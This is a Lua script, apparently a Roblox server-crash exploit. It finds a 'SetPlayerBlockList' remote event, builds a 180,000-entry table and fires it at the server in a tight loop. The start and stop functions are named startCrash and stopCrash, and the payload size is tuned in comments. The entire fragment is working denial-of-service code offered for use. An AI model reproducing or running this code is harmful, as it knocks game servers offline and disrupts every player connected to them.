-- ═══════════ CORE LOGIC ═══════════
local Children       = 180000   -- 🚨 RESTORED TO 180K
local FireBurst      = 1.5
local FrameDelay     = 0.130
local Format         = "pair"   -- 🚨 RESTORED TO PAIR

local state = { running = false, thread = nil, remote = nil, cache = nil, interval = 2.5, passes = 0 }
local RemoteCandidates = {
    { "RobloxReplicatedStorage", "SetPlayerBlockList" },
    { "ReplicatedStorage",       "SetPlayerBlockList" },
}

local function resolve()
    for _, path in ipairs(RemoteCandidates) do
        local node, ok = game, true
        for i = 1, #path do
            local nxt = node:FindFirstChild(path[i])
            if not nxt then ok = false; break end
            node = nxt
        end
        if ok and node and (node:IsA("RemoteEvent") or node:IsA("UnreliableRemoteEvent")) then
            return node
        end
    end
    return nil
end

local function build(size)
    local sz = size or Children
    local root = table.create(sz)
    if Format == "flat" then
        for i = 1, sz do root[i] = i end
        return root
    end
    for i = 1, sz do root[i] = { id = i, v = i * 2 } end
    return root
end

local function fire()
    if not state.remote then
        state.remote = resolve()
        if not state.remote then return end
    end
    if not state.cache then state.cache = build() end
    for _ = 1, FireBurst do
        state.remote:FireServer(state.cache)
    end
    state.passes += 1
end

local function startCrash()
    if state.running then return end
    state.running = true
    state.passes = 0
    state.thread = task.spawn(function()
        while state.running do
            pcall(fire)
            task.wait(FrameDelay)
        end
    end)
end

local function stopCrash()
    state.running = false
    if state.thread then pcall(task.cancel, state.thread) end
    state.thread = nil
    state.cache = nil
end

local function getPing()
    local ok, p = pcall(function() return Stats.Network.ServerStatsItem["Data Ping"]:GetValue() end)
    return ok and math.floor(p) or 0
end

